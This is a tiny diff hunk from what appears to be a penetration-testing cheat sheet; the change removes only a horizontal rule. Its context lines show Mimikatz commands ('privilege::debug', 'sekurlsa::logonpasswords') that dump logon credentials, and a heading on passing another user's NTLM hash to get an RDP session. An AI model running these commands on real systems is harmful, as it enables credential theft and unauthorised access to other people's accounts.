@@ -17,8 +17,6 @@ privilege::debug
 sekurlsa::logonpasswords
 ```
 
----
-
 To pass the NTLM hash of another user to get RDP session:
 ```shell
 privilege::debug
